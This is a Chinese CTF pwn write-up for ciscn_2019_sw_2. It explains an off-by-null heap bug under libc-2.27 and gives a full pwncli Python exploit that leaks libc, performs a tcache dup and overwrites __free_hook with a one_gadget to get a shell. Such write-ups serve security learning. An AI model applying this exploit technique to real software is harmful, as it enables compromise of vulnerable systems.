# ciscn_2019_sw_2



### 总结

`libc-2.27`版本下的`off by null`。

<!-- more -->

### 题目分析

#### checksec

![image-20211017212530871](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211017212530871.png)


### 漏洞点

在`add`分支，存在一个`off by null`，由`strcpy`导致的

![image-20211017212633114](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211017212633114.png)

### 利用思路

步骤：

- 三明治结构，泄露地址
- 两个指针指向同一块`chunk`
- `tcache dup`修改`__free_hook`为`one_gadget`即可

### EXP

`exp`均使用`pwncli`编写，欢迎试用！

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="dead"):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)


def show(idx):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(idx))
    m = p.recvline(0)
    info(f"get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(idx))

# libc-2.27 off by null

add(0x420) # 0
add(0x80) # 1
add(0x4f0) # 2
add(0x10, "/bin/sh\x00") # 3

dele(0)
dele(1)
add(0x88, "a"*0x88) # 0

dele(0)
add(0x88, b"a"*0x80 + p64(0x4c0)) # 0

dele(2)
add(0x420) # 1

m = show(0)
libc_base = u64_ex(m) - 0x3ebca0
log_libc_base_addr(libc_base)
libc.address = libc_base

add(0x80) # 2

dele(0)
dele(2)

add(0x80, p64(libc.sym['__free_hook']))
add(0x80)
add(0x80, p64(libc_base + list(get_current_one_gadget())[1]))

dele(3)

get_flag_when_get_shell(p)

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-10-17-ciscn-2019-sw-2/  

